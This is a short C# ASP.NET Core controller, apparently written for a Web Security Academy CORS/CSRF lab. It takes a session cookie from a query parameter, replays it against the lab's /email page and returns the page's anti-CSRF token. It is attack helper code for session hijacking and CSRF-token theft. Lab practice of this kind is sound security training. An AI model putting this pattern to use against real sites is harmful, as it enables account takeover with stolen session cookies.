using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using HtmlAgilityPack;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace PrivateServerWithCorsAllOrigins.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class CsrfController : ControllerBase
    {
        private readonly ILogger<CsrfController> _logger;

        public CsrfController(ILogger<CsrfController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public IActionResult Get([FromQuery]string cookie)
        {
            var webClient = new WebClient();
            webClient.Headers.Add("Cookie", cookie);
            var html = webClient.DownloadString("https://acbb1fdf1f3e0a02807b33ec0085001e.web-security-academy.net/email");
            var doc = new HtmlDocument();
            doc.LoadHtml(html);

            var allInputs = doc.DocumentNode.Descendants().Where(x => x.Name == "input");
            var csrfInput = allInputs.Last();

            return Ok(csrfInput.Attributes["value"].Value);
        }
    }
}
